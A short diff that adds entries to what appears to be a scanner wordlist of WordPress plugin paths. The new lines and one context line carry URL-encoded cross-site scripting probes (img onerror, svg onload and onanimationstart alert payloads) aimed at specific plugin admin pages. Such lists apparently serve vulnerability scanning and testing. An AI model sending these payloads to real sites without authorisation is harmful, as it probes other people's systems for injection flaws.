@@ -11431,3 +11431,6 @@ request?info=<svg onload=alert(
 /wp-content/plugins/order-attachments-for-woocommerce/readme.txt
 /wp-content/plugins/sku-for-woocommerce/readme.txt
 /wp-content/plugins/ratemyagent-official/readme.txt
+/wp-admin/admin-ajax.php?action=fts_encrypt_token_ajax&access_token=%3Cimg%20src=x%20onerror=alert(/XSS/)%3E
+/wp-admin/admin.php?page=tiempocom%2Fapp%2Fadmin.php&action=new
+/wp-admin/admin.php?page=watu_exams&title=%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28%2FXSS%2F%29%2F%2F
